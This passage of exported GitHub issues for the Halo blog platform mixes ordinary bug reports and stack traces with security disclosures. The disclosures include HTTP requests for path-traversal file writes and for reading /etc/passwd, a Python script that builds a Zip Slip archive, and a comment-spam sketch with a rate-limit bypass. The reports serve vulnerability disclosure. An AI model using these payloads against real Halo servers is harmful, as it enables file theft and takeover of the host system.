		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **I am sure I have checked**  - [x] [Halo User Guide Documentation ](https://halo.run/docs) - [x] [Halo BBS](https://bbs.halo.run) - [x] [Github Wiki ](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [Other Issues](https://github.com/halo-dev/halo/issues)  ---- **I want to apply**   - [x] BUG feedback  An interface to write files in the background, a directory traversal check is performed on the input path parameter, but the startsWith function can be used to bypass it.  ``` PUT /api/admin/themes/caicai_anatole/files/content HTTP/1.1 Host: xxxx:8090 Content-Length: 105 Admin-Authorization: 19cfedbb4994443c8b3f7eebf9ef36b3 Accept: application/json, text/plain, */* User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Content-Type: application/json;charset=UTF-8 Origin: http://xxx:8090 Referer: http://xxxx:8090/admin/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close  {"path":"/root/.halo/templates/themes/anatole/../../../../../../tmp/pwned","content":"xxxxx\nxxxttt\nbb"} ``` ![image](https://user-images.githubusercontent.com/16250867/70615930-4f302600-1c48-11ea-92ec-9cf3c27f64cc.png)  Therefore, the attacker can overwrite some files, such as ftl files, .bashrc files in the user directory, and finally get the permissions of the operating system</body>
		<created>2019-12-11 11:00:30</created>
		<closed>2019-12-12 16:21:37</closed>
	</bug>
	<bug>
		<id>420</id>
		<title>An Arbitrary File reading vulnerability in the backend(bypass the Path check)</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt; **I am sure I have checked**   - [x] [Halo User Guide Documentation ](https://halo.run/docs) - [x] [Halo BBS](https://bbs.halo.run) - [x] [Github Wiki ](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [Other Issues](https://github.com/halo-dev/halo/issues)  ---- **I want to apply**   - [x] BUG feedback  In an interface that reads files in the background, a directory traversal check is performed on the input path parameter, but the startsWith function can be used to bypass it. ![image](https://user-images.githubusercontent.com/16250867/70615169-dd0b1180-1c46-11ea-8a92-918a7134fee8.png) So I can read any file using the following message ![image](https://user-images.githubusercontent.com/16250867/70615059-a59c6500-1c46-11ea-9c60-7413c0d60047.png) ``` GET /api/admin/themes/caicai_anatole/files/content?path=%2Froot%2F.halo%2Ftemplates%2Fthemes%2Fanatole%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F/passwd HTTP/1.1 Host: 100.101.61.13:8090 Admin-Authorization: 19cfedbb4994443c8b3f7eebf9ef36b3 Accept: application/json, text/plain, */* User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Referer: http://100.101.61.13:8090/admin/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close  ``` </body>
		<created>2019-12-11 10:52:58</created>
		<closed>2019-12-12 17:13:17</closed>
	</bug>
	<bug>
		<id>418</id>
		<title>A Zip Slip Directory Traversal Vulnerability in the backend</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **I am sure I have checked**   - [x] [Halo User Guide Documentation ](https://halo.run/docs) - [x] [Halo BBS](https://bbs.halo.run) - [x] [Github Wiki ](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [Other Issues](https://github.com/halo-dev/halo/issues)  ----  **I want to apply**    - [x] BUG feedback  When we want to install a theme, we can choose to download and install it from a remote http address， When downloading a zip file and decompressing it, there is no path verification, and it can be decompressed to any path in any operating system. This is very dangerous and can allow malicious people to obtain operating system permissions.  First make a evil zip file，Make this zip file using python code ```python import zipfile, sys if(len(sys.argv) != 2):     print "[+] Usage : python exploit.py file_to_do_the_traversal [+]"     print "[+] Example: python exploit.py test.txt"     exit(0) zf = zipfile.ZipFile("evil-foo.zip", "w") zf.write(sys.argv[1], "..\\..\\..\\..\\..\\..\\..\\..\\tmp\\\\test.txt") zf.close() print "[+] Created evil.zip successfully [+]" ``` like this ![image](https://user-images.githubusercontent.com/16250867/70613552-cca56780-1c43-11ea-8784-660a7f7b7665.png) Then start an http service and use the installation theme feature to start the installation ``` POST /api/admin/themes/fetching?uri=http:%2F%2F127.0.0.1:2333/evil-foo.zip HTTP/1.1 Host: 100.101.61.13:8090 Content-Length: 0 Admin-Authorization: 6ccadd335f0d4719a9418c0b16cfdc99 Accept: application/json, text/plain, */* User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Origin: http://100.101.61.13:8090 Referer: http://100.101.61.13:8090/admin/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ``` Then you can see that our file test.txt is decompressed to the / tmp directory. ![image](https://user-images.githubusercontent.com/16250867/70613889-6e2cb900-1c44-11ea-81f4-d5ce44b7cd6d.png) Therefore, the attacker can overwrite some files, such as ftl files, .bashrc files in the user directory, and finally get the permissions of the operating system   </body>
		<created>2019-12-11 10:35:33</created>
		<closed>2019-12-12 16:19:06</closed>
	</bug>
	<bug>
		<id>416</id>
		<title>ico 图片上传到云存储失败</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持 </body>
		<created>2019-12-10 02:38:08</created>
		<closed>2019-12-10 03:07:19</closed>
	</bug>
	<bug>
		<id>415</id>
		<title>上传 *.ico 图片失败</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  ---  ```java org.springframework.web.util.NestedServletException: Handler dispatch failed; nested exception is java.lang.NoClassDefFoundError: Could not initialize class sun.awt.image.IntegerInterleavedRaster         at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1055) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at javax.servlet.http.HttpServlet.service(HttpServlet.java:523) ~[jakarta.servlet-api-4.0.3.jar!/:4.0.3]         at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[jakarta.servlet-api-4.0.3.jar!/:4.0.3]         at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at run.halo.app.security.filter.AdminAuthenticationFilter.doAuthenticate(AdminAuthenticationFilter.java:89) ~[classes!/:1.1.3-beta.3]         at run.halo.app.security.filter.AbstractAuthenticationFilter.doFilterInternal(AbstractAuthenticationFilter.java:166) ~[classes!/:1.1.3-beta.3]         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at run.halo.app.filter.CorsFilter.doFilter(CorsFilter.java:42) ~[classes!/:1.1.3-beta.3]         at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:108) ~[spring-boot-actuator-2.2.1.RELEASE.jar!/:2.2.1.RELEASE]         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) ~[na:na]         at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) ~[na:na]         at java.base/java.lang.Thread.run(Thread.java:835) ~[na:na] Caused by: java.lang.NoClassDefFoundError: Could not initialize class sun.awt.image.IntegerInterleavedRaster         at java.desktop/java.awt.image.Raster.createPackedRaster(Raster.java:819) ~[na:na]         at java.desktop/java.awt.image.Raster.createPackedRaster(Raster.java:475) ~[na:na]         at java.desktop/java.awt.image.DirectColorModel.createCompatibleWritableRaster(DirectColorModel.java:1032) ~[na:na]         at java.desktop/java.awt.image.BufferedImage.&lt;init&gt;(BufferedImage.java:333) ~[na:na]         at net.sf.image4j.codec.bmp.BMPDecoder.read32(BMPDecoder.java:599) ~[image4j-0.7zensight1.jar!/:0.7zensight1]         at net.sf.image4j.codec.bmp.BMPDecoder.read(BMPDecoder.java:197) ~[image4j-0.7zensight1.jar!/:0.7zensight1]         at net.sf.image4j.codec.bmp.BMPDecoder.read(BMPDecoder.java:144) ~[image4j-0.7zensight1.jar!/:0.7zensight1]         at net.sf.image4j.codec.ico.ICODecoder.readExt(ICODecoder.java:125) ~[image4j-0.7zensight1.jar!/:0.7zensight1]         at net.sf.image4j.codec.ico.ICODecoder.read(ICODecoder.java:65) ~[image4j-0.7zensight1.jar!/:0.7zensight1]         at net.sf.image4j.codec.ico.ICODecoder.read(ICODecoder.java:42) ~[image4j-0.7zensight1.jar!/:0.7zensight1]         at run.halo.app.handler.file.LocalFileHandler.getImageFromFile(LocalFileHandler.java:249) ~[classes!/:1.1.3-beta.3]         at run.halo.app.handler.file.LocalFileHandler.upload(LocalFileHandler.java:157) ~[classes!/:1.1.3-beta.3]         at run.halo.app.handler.file.FileHandlers.upload(FileHandlers.java:54) ~[classes!/:1.1.3-beta.3]         at run.halo.app.service.impl.AttachmentServiceImpl.upload(AttachmentServiceImpl.java:105) ~[classes!/:1.1.3-beta.3]         at run.halo.app.service.impl.AttachmentServiceImpl$$FastClassBySpringCGLIB$$2d9c80b9.invoke(&lt;generated&gt;) ~[classes!/:1.1.3-beta.3]         at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:685) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at run.halo.app.service.impl.AttachmentServiceImpl$$EnhancerBySpringCGLIB$$e415f715.upload(&lt;generated&gt;) ~[classes!/:1.1.3-beta.3]         at run.halo.app.controller.admin.api.AttachmentController.uploadAttachment(AttachmentController.java:86) ~[classes!/:1.1.3-beta.3]         at run.halo.app.controller.admin.api.AttachmentController$$FastClassBySpringCGLIB$$8f3ff968.invoke(&lt;generated&gt;) ~[classes!/:1.1.3-beta.3]         at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at run.halo.app.core.ControllerLogAop.controller(ControllerLogAop.java:45) ~[classes!/:1.1.3-beta.3]         at jdk.internal.reflect.GeneratedMethodAccessor251.invoke(Unknown Source) ~[na:na]         at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]         at java.base/java.lang.reflect.Method.invoke(Method.java:567) ~[na:na]         at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:93) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at run.halo.app.controller.admin.api.AttachmentController$$EnhancerBySpringCGLIB$$366792aa.uploadAttachment(&lt;generated&gt;) ~[classes!/:1.1.3-beta.3]         at jdk.internal.reflect.GeneratedMethodAccessor853.invoke(Unknown Source) ~[na:na]         at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]         at java.base/java.lang.reflect.Method.invoke(Method.java:567) ~[na:na]         at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:888) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         ... 56 common frames omitted  ``` </body>
		<created>2019-12-07 15:34:02</created>
		<closed>2020-03-14 03:13:56</closed>
	</bug>
	<bug>
		<id>413</id>
		<title>建議加入對於評論系統的限流措施</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  ***  ## 評論系統問題  由於評論系統沒有任何的限制，且在後端 API 上沒有其他的安全驗證，導致非常容易受到惡意的請求（例如，刷評論），API Endpoint 如下：  ``` https://&lt;halo_host&gt;/api/content/posts/comments ```  其中 Params 可以爲一個字典：  ``` {"author":"Nova","authorUrl":"fa-ke.moe","email":"nova@nova.moe","content":"&lt;script&gt;123&lt;/script&gt;","postId":3} ```  如此看來，這樣一個 POC 就非常常見了，Halo 使用了基於 IP 的限流措施，此時可以直接使用代理池灌入，簡易 POC 如下  ```python import requests import sys import time import random url = "https://&lt;halo_host&gt;//api/content/posts/comments"  data = {"author":"Nova","authorUrl":"fa-ke.moe","email":"nova@nova.moe","content":"&lt;script&gt;123&lt;/script&gt;","postId":3} requests.post(url,json=data) ```  如果沒有代理池的話，也可以跑幾個腳本，然後持續開啓，不過這樣會遇到限流的問題，在：  ``` src/main/java/run/halo/app/cache/lock/CacheLock.java ```  中行 41 可以看到：  ```java long expired() default 5; ```  只要指定超時時間爲 5s 即可繞開.  考慮加入 Captcha 或其他方式解決相關問題.  ## 評論 Exception 問題  在 `src/main/java/run/halo/app/cache/lock/CacheLockInterceptor.java` 的行 65，Exception 時沒有設置字符集，錯誤信息中會包含字節碼（類似 `\xe8\xaf\xbe\xe7\xa8\x8b`）.  ## Issues 模板問題  頂部的：  ``` - [x] [Halo 使用文档](https://halo.run/docs) ```  其中 `https://halo.run/docs` 已經 404 了.</body>
		<created>2019-12-06 16:08:17</created>
		<closed>2020-01-16 11:23:51</closed>
	</bug>
	<bug>
		<id>408</id>
		<title>主题压缩包内如存在 .DS_Store 之类的文件会提示找不到说明文件。</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  RT</body>
		<created>2019-11-29 11:48:27</created>
		<closed>2019-12-10 02:01:43</closed>
	</bug>
	<bug>
		<id>406</id>
		<title>在获取下一篇和上一篇的时候需要根据排序规则。</title>
		<body>不然会导致和首页文章列表顺序不一致的情况。  &lt;sub&gt;Sent from &lt;a href="https://itunes.apple.com/cn/app/id1314212521"&gt;PPHub&lt;/a&gt;&lt;/sub&gt;</body>
		<created>2019-11-28 09:31:28</created>
		<closed>2020-01-16 10:02:11</closed>
	</bug>
	<bug>
		<id>396</id>
		<title>更新主题失败</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  ![image](https://user-images.githubusercontent.com/23736683/69488510-2fa5a900-0ea5-11ea-8687-961909f14b68.png) </body>
		<created>2019-11-24 02:28:56</created>
		<closed>2019-11-24 11:01:36</closed>
	</bug>
	<bug>
		<id>387</id>
		<title>最新测试版 v1.1.3-beta.1 存在文件流未关闭问题</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  ---  由于备份博客的时候需要压缩目录，打开太多的文件而未关闭，从而导致以下错误：  ```java 2019-11-19 09:05:01.329 ERROR 24651 --- [XNIO-1 Accept] org.xnio.nio.tcp.server                  : Exception accepting request, closing server channel TCP server (NIO) &lt;2fa63774&gt;  java.io.IOException: Too many open files         at java.base/sun.nio.ch.ServerSocketChannelImpl.accept0(Native Method) ~[na:na]         at java.base/sun.nio.ch.ServerSocketChannelImpl.accept(ServerSocketChannelImpl.java:525) ~[na:na]         at java.base/sun.nio.ch.ServerSocketChannelImpl.accept(ServerSocketChannelImpl.java:277) ~[na:na]         at 